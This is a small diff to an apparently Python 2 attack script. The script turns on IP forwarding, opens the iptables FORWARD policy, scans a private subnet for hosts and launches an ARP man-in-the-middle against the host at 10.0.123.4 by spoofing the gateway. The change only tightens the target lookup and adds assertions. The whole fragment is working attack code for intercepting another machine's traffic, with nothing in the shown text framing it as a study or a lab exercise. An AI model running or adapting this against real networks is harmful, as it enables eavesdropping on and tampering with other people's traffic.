@@ -6,7 +6,10 @@ os.system("sysctl -w net.ipv4.ip_forward=1")
 os.system("iptables -P FORWARD ACCEPT")
 
 gateway, hosts = get_hosts("enp0s10", "10.0.123.1/255.255.255.0", 3, None, [])
-target = [host for host in hosts if host.ip == "10.0.123.4"]
+target = next((host for host in hosts if host.ip == "10.0.123.4"), None)
+
+assert gateway
+assert target
 
 _ = raw_input("press enter to start arp mitm\n")
 target.arp_mitm(gateway.ip, gateway.mac, "08:00:27:52:b1:13")
